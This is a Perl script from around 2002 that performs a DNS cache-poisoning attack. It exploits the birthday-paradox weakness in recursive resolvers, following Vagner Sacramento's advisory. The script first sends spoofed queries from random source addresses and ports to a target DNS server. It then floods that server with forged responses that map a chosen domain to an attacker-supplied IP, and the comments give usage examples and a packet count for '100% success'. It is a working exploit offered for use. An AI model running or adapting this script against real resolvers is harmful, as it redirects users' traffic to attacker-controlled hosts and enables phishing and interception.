#!/usr/bin/perl
#
# By Ramon Izaguirre
#
# happydnspoofing is a tool to perform a more effective DNS spoofing attack by taking advantage of the vulnerability exposed by Vagner Sacramento (http://www.rnp.br/cais/alertas/2002/cais-ALR-19112002a.html) and pointed out by Joe Stewart (http://www.securityfocus.com/guest/17905).
#
# the sintax looks quite rare but think how to build the spoofed packet and it will make sense.
#
# for example:
#
# we have www.example.com and we want to deceive 172.16.54.3 ( a dns server that allows recursive queries to be performed) into thinking that www.example.com resolves to 192.168.0.1
#
# dig (the dns server of) example.com -> source(ip) = 10.0.0.1
#      -> destination(ip) = 172.16.54.3
# poison.pl 172.16.54.3 www.mydomain.com-> source_port = 32546
#      -> domain = www.example.com
#      -> spoofed(ip) = 192.168.0.1
# for a probability of 100% sucess -> number_of_packets = 1140
#
#
# <---------------------------------- ip packet ---------------------------------------->
#                                     <-------------------udp segment------------------->
#                                                     <-----------dns data-------------->
#______________________________________________________________________________________
# |...|source(ip)|destination(ip)|...|source_port|...|      domain     |spoofed(ip) |...|
#  --------------------------------------------------------------------------------------
#______________________________________________________________________________________
# |...| 10.0.0.1 |  172.16.54.3  |...|   32546   |...| www.example.com |192.168.0.1 |...|
#  -------------------------------------------------------------------------------------- 
#
# ./hds0.pl 10.0.0.1 172.16.54.3 32546 www.example.com 192.168.0.1

use Net::DNS;
use Net::RawIP qw(:pcap);
#use strict; # too strict

$| = 1;
my $usage = "\nusage: $0 source(ip) destination(ip) source_port domain spoofed(ip) [number_of_packets]\n";

die "$usage" unless $ARGV[0] && $ARGV[1] && $ARGV[2] && $ARGV[3] && $ARGV[4];

# those are parameters to build the queries at layers 3,4,7.
my @anyip;
my @anyport;
my @anyid;

# those are parameters to build the fake responses at layers 3,4,7.
my $saddr=$ARGV[0];
my $daddr=$ARGV[1];
my $sport=$ARGV[2];
my $dport='53';
my $fakeip = $ARGV[4];
my @transId;

# parameters for both, queries and responses.
my $domain = $ARGV[3];

# more parameters.
$m = 1140;
if ($ARGV[5]!=0) {$m = $ARGV[5];}

# auxiliary parameters.
my $s;
my $t;
my $x;
my $port_range = 64512; #65536-1024
my $id_range = 65536;

# build query packets skeleton...
my $packet_q = Net::DNS::Packet->new($domain);
my $restpacket_q = substr($packet_q->data,2);
my $udp_q = new Net::RawIP({ip=> {daddr=>$daddr}, udp=>{dest=>$dport}});

# build response packets skeleton and more...
my $packet_r = Net::DNS::Packet->new($domain);
$packet_r->push("pre",rr_add($domain . " A " . $fakeip));
$packet_r->header->qr(1);
my $restpacket_r = substr($packet_r->data,2);
my $udp_r = new Net::RawIP({ip=> {saddr=>$saddr, daddr=>$daddr},
udp=>{source=>$dport, dest=>$sport}});

for (0..($m - 1))
 { $anyip[$_] = sprintf("%d.%d.%d.%d",int(rand(224)),int(rand(256)),int(rand(256)),int(rand( 256)));
   $anyport[$_] = sprintf("%d", int(rand($port_range)+1024));
   $anyid[$_] =   pack ("H*", sprintf("%.4x", int(rand($id_range))));
 }

#print "\n---> Source IP\t\tDestination IP\tSPort\tDPort\ttransaction ID";

# Generate unique transaction Ids.

print "\nGenerating unique transaction id numbers...";

for ($x=0; $x<$m; $x++)
 {
   $t=1;
   while($t==1)
   {
    $t=0;
    $s = pack ("H*", sprintf("%.4x", int(rand($id_range))));
    for (@transId) { if ( $s eq $_ ) {$t = 1; break;}}
   }
   $transId[$x] = $s;
#   print "\n---> $anyip[$x]\t$daddr\t$anyport[$x]\t$dport";
 }



#----------------------------------------------------------------------------------------------
# start sending queries...

print "\nSending the packets...";

for (0..($m - 1)) {
     $udp_q->set({ip=> {saddr=>$anyip[$_]}, udp=>{source=>$anyport[$_],
data=>$anyid[$_] . $restpacket_q}});
     $udp_q->send();
    }

# start sending responses...
for (@transId) {
  $udp_r->set({udp=>{data=>$_ . $restpacket_r}});
  $udp_r->send();
  }

print "\nDone.\n";
